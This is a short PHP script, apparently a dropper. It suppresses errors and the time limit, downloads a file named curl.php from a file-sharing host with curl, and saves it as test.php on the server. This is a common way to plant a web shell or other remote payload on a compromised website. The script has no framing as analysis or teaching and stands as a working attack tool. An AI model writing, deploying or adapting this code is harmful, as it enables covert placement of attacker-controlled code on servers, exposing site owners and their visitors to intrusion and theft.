<?php
set_time_limit(0);
error_reporting(0);

$url = "https://bashupload.com/zRM5U/curl.php";
$filename = "test.php";

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$file = curl_exec($ch);
curl_close($ch);

if ($file !== false) {
    file_put_contents($filename, $file);
}
?>